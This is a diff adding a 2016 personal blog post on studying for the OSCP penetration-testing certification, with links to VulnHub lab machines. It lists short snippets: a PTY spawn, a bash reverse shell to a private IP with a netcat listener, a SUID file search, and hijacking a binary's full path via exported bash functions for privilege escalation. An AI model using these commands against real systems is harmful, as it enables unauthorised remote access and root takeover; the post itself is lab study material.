@@ -1,0 +1,66 @@
+---
+layout: post
+title: 'Path to OSCP - Part 2'
+date: 2016-02-17 03:09:07.000000000 +03:00
+type: post
+published: true
+status: publish
+categories:
+- Path to OSCP
+tags:
+- oscp
+- vuln
+meta:
+  _oembed_93d4d6be67b08cca9543e0552055159d: '{{unknown}}'
+  _rest_api_published: '1'
+  _rest_api_client_id: '43452'
+  _publicize_done_external: a:2:{s:7:"twitter";a:1:{i:13596827;s:50:"https://twitter.com/unfo/status/699755306331451392";}s:8:"facebook";a:1:{i:13596832;s:38:"https://facebook.com/10153984116708281";}}
+  _publicize_job_id: '19877965368'
+  publicize_linkedin_url: https://www.linkedin.com/updates?discuss=&scope=106127&stype=M&topic=6105520992585605124&type=U&a=OOCa
+  _publicize_done_13656638: '1'
+  _wpas_done_13596824: '1'
+  _publicize_done_13656641: '1'
+  _wpas_done_13596827: '1'
+  publicize_twitter_user: unfo
+  _publicize_done_13656646: '1'
+  _wpas_done_13596832: '1'
+  publicize_tumblr_url: http://.tumblr.com/post/139452948540
+  _publicize_done_13656651: '1'
+  _wpas_done_13596836: '1'
+author:
+  login: jwikholm
+  email: jw@jw.fi
+  display_name: Jan Wikholm
+  first_name: ''
+  last_name: ''
+---
+<p>Here's the second episode on my path to becoming OSCP certified.</p>
+<p>https://www.youtube.com/watch?v=lAyTP8YNGl4</p>
+<h2>Related links</h2>
+<ul>
+<li><a href="https://www.vulnhub.com/">VulnHub</a></li>
+<li><a href="https://www.vulnhub.com/entry/tr0ll-1,100/">Tr0ll VM </a>which I rooted</li>
+<li><a href="https://www.vulnhub.com/entry/tr0ll-2,107/">Tr0ll2 VM</a> which I failed because I didn't think to try shellshock</li>
+<li><a href="https://research.g0blin.co.uk/devrandom-sleepy-vulnhub-writeup/">Great walkthrough</a> from which I learned the nifty trick of bash function name masking a binary (Snippet 1)</li>
+</ul>
+<h2>Snippets</h2>
+<h3>Spawn TTY</h3>
+<pre>python -c 'import pty;pty.spawn("/bin/bash")'</pre>
+<p>Related: <a href="http://unix.stackexchange.com/a/122624/43870">Why do you need tty for sudo</a></p>
+<h3>Redirect bash to tcp socket</h3>
+<pre>/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.107/6666 0&gt;&amp;1
+# then at receiver:
+nc -l -n -v -p 6666
+# And wait for incoming bash shell</pre>
+<h3>Find SUID/SGUID files for privilege escalation</h3>
+<pre>find / -user root -perm -4000 -print 2&gt;/dev/null</pre>
+<p>Of course if you can somehow exploit these results, you might get root</p>
+<h3>Hijack a binary's full path in bash to exec your own code</h3>
+<pre>$ function /usr/bin/foo () { /usr/bin/echo "It works"; }
+$ export -f /usr/bin/foo
+$ /usr/bin/foo
+It works
+</pre>
+<p>Of course you might want this if a SUID bit programing is calling some binary by full path and you cannot alter that binary but want to hijack the execution</p>
+<p>&nbsp;</p>
+<p>.</p>
